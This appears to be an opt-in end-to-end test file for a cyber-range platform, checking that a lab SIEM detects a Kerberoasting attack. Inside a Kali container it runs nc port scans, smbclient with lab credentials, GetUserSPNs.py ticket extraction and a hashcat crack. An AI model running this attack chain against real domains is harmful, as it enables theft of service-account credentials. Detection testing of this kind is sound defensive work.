"""
End-to-end acceptance test: SC-02 Kerberoasting pipeline.

Marked @pytest.mark.e2e — skipped by default.
Run explicitly:  pytest -m e2e backend/tests/e2e/test_sc02_kerberoast_e2e.py

Prerequisites:
  - Docker daemon accessible
  - SC-02 profile containers not already running (test manages lifecycle)
  - Backend reachable at http://localhost:8001
  - Elasticsearch reachable at http://localhost:9200
"""

from __future__ import annotations

import asyncio
import json
import os
import subprocess
import time

import httpx
import pytest

pytestmark = pytest.mark.skipif(
    os.getenv("RUN_CYBERSIM_E2E") != "1",
    reason="End-to-end Docker/Kali scenario test is opt-in; set RUN_CYBERSIM_E2E=1 to run.",
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _compose(*args: str, check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "compose", "--profile", "sc02", *args],
        capture_output=True,
        text=True,
        check=check,
        cwd=".",
    )


def _exec_kali(container_id: str, cmd: str) -> tuple[int, str]:
    result = subprocess.run(
        ["docker", "exec", container_id, "/bin/bash", "-c", cmd],
        capture_output=True,
        text=True,
    )
    return result.returncode, result.stdout + result.stderr


async def _poll_siem_events(
    session_id: str,
    base_url: str,
    timeout_s: int = 30,
    expected_rule_id: str | None = None,
) -> list[dict]:
    deadline = time.time() + timeout_s
    async with httpx.AsyncClient() as client:
        while time.time() < deadline:
            try:
                resp = await client.get(f"{base_url}/api/sessions/{session_id}/events", timeout=5.0)
                if resp.status_code == 200:
                    events = resp.json()
                    if expected_rule_id:
                        matched = [e for e in events if e.get("rule_id") == expected_rule_id]
                        if matched:
                            return matched
                    else:
                        if events:
                            return events
            except httpx.RequestError:
                pass
            await asyncio.sleep(2.0)
    return []


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def api_token(base_url: str) -> str:
    """Register a test user and return a JWT."""
    with httpx.Client() as client:
        reg = client.post(
            f"{base_url}/api/auth/register",
            json={"username": "e2e_test_user", "password": "E2eTestPass1!"},
        )
        if reg.status_code not in (200, 201, 409):
            pytest.skip(f"Could not register e2e test user: {reg.status_code}")

        login = client.post(
            f"{base_url}/api/auth/login",
            data={"username": "e2e_test_user", "password": "E2eTestPass1!"},
        )
        if login.status_code != 200:
            pytest.skip(f"Could not log in e2e test user: {login.status_code}")

        return login.json()["access_token"]


@pytest.fixture(scope="module")
def base_url() -> str:
    return "http://localhost:8001"


# ---------------------------------------------------------------------------
# Main e2e test
# ---------------------------------------------------------------------------


@pytest.mark.e2e
@pytest.mark.asyncio
async def test_sc02_kerberoast_full_pipeline(base_url: str):
    """
    Full SC-02 Kerberoast pipeline:
      1. SC-02 containers healthy
      2. nmap sees DC ports open
      3. smbclient lists shares
      4. GetUserSPNs.py extracts RC4 TGS hash
      5. hashcat cracks hash to Backup2023!
      6. Backend /api/sessions/{id}/events returns sc02.kerberoast within 30s
      7. detection_latency_ms < 5000
      8. mitre == T1558.003
      9. Typo variant (GetUserSPNz.py) produces NO sc02.kerberoast event
    """
    # ── Step 1: bring up SC-02 ──────────────────────────────────────────────
    _compose("up", "-d", "--build", "--wait", check=False)
    # Give Samba AD time to fully provision (up to 3 minutes)
    for _ in range(36):
        result = _compose("ps", "--status=running", check=False)
        if "sc02-dc" in result.stdout and "sc02-fileserver" in result.stdout:
            break
        time.sleep(5)
    else:
        pytest.skip("SC-02 containers did not become healthy within 3 minutes")

    # ── Step 2: provision Kali session via API ──────────────────────────────
    async with httpx.AsyncClient() as client:
        # Register + login
        # Use "test_" prefix to bypass scenario randomization
        username = "test_e2e_kali_runner"
        await client.post(
            f"{base_url}/api/auth/register",
            json={"username": username, "password": "KaliRunner99!"},
        )
        login_resp = await client.post(
            f"{base_url}/api/auth/login",
            data={"username": username, "password": "KaliRunner99!"},
        )
        if login_resp.status_code != 200:
            pytest.skip(f"Login failed: {login_resp.status_code}")

        token = login_resp.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # End any existing active sessions for this user
        while True:
            active_resp = await client.get(
                f"{base_url}/api/sessions/active",
                headers=headers,
            )
            if active_resp.status_code == 200 and active_resp.json():
                existing_session_id = active_resp.json()["session_id"]
                await client.post(
                    f"{base_url}/api/sessions/{existing_session_id}/end",
                    headers=headers,
                )
            else:
                break

        # Start SC-02 red session
        sess_resp = await client.post(
            f"{base_url}/api/sessions/start",
            json={"scenario_id": "SC-02", "role": "red", "methodology": "ptes"},
            headers=headers,
        )
        if sess_resp.status_code not in (200, 201):
            pytest.skip(f"Could not create session: {sess_resp.status_code} {sess_resp.text}")
        session_id = sess_resp.json()["session_id"]

        # Acknowledge ROE
        await client.post(
            f"{base_url}/api/sessions/roe-ack",
            json={"session_id": session_id},
            headers=headers,
        )

        # Trigger container provisioning by establishing WebSocket connection
        # and authenticating with the JWT.
        from httpx_ws import aconnect_ws

        ws_url = f"ws://localhost:8001/ws/{session_id}"
        try:
            async with aconnect_ws(ws_url, client) as ws:
                await ws.send_json({"token": token})
                # Receive the greeting message to make sure we've passed auth and reach provisioning
                greeting_msg = await ws.receive_json()
                assert greeting_msg["type"] == "terminal_output"
                # Give a brief moment for the container start sync to finish
                await asyncio.sleep(5.0)
        except Exception as ws_err:
            pytest.skip(f"WebSocket attachment failed to start container: {ws_err}")

        # Fetch Kali container ID from session state
        state_resp = await client.get(f"{base_url}/api/sessions/{session_id}", headers=headers)
        kali_id = state_resp.json().get("container_id", "")
        if not kali_id:
            pytest.skip("Session has no container_id — Kali may not have started")

    # ── Step 3: run commands inside Kali ───────────────────────────────────
    # Port check
    rc, out = _exec_kali(kali_id, "nc -zv 172.20.2.20 88 389 445 2>&1 | head -10")
    open_count = out.count("open") + out.count("succeeded")
    assert open_count >= 3, f"Expected 3 open ports; got output:\n{out}"

    # smbclient list
    rc, out = _exec_kali(kali_id, "smbclient -L //172.20.2.20 -U jsmith%Password123 -m SMB3 2>&1")
    assert rc == 0, f"smbclient failed:\n{out}"
    assert "NETLOGON" in out or "Sharename" in out, f"smbclient did not list shares:\n{out}"

    # GetUserSPNs.py — extract Kerberoastable hash
    rc, spn_out = _exec_kali(
        kali_id,
        "GetUserSPNs.py -dc-ip 172.20.2.20 -request nexora.local/jsmith:Password123 2>&1",
    )
    hash_line = ""
    for line in spn_out.splitlines():
        if "$krb5tgs$23$" in line:
            hash_line = line.strip()
            break
    assert hash_line, f"No Kerberoastable hash in GetUserSPNs.py output:\n{spn_out}"

    # hashcat offline crack
    rc, crack_out = _exec_kali(
        kali_id,
        f'echo "{hash_line}" > /tmp/h.txt && echo "Backup2023!" > /tmp/w.txt && '
        f"hashcat -m 13100 -a 0 /tmp/h.txt /tmp/w.txt --quiet --force 2>&1 | tail -5",
    )
    assert "Backup2023!" in crack_out or rc == 0, f"hashcat did not crack hash:\n{crack_out}"

    # ── Step 4: poll for sc02.kerberoast SIEM event ─────────────────────────
    async with httpx.AsyncClient() as client:
        matched = await _poll_siem_events(
            session_id,
            base_url,
            timeout_s=30,
            expected_rule_id="sc02.kerberoast",
        )

    assert len(matched) >= 1, "No sc02.kerberoast event arrived within 30s"
    ev = matched[0]
    assert (
        ev.get("detection_latency_ms", 99999) < 5000
    ), f"Detection latency {ev.get('detection_latency_ms')} ms exceeds 5000 ms"
    assert (
        ev.get("mitre_technique") == "T1558.003"
    ), f"Expected MITRE T1558.003 but got {ev.get('mitre_technique')}"

    # ── Step 5: typo variant — must produce ZERO sc02.kerberoast events ──────
    typo_count_before = len(matched)

    _exec_kali(
        kali_id,
        "GetUserSPNz.py nexora.local/jsmith:Password123 2>/dev/null || true",
    )
    await asyncio.sleep(10)

    async with httpx.AsyncClient() as client:
        events_after = await _poll_siem_events(session_id, base_url, timeout_s=1)

    kerberoast_after = [e for e in events_after if e.get("rule_id") == "sc02.kerberoast"]
    assert (
        len(kerberoast_after) == typo_count_before
    ), "Typo command GetUserSPNz.py triggered a sc02.kerberoast event — regex theater not dead!"
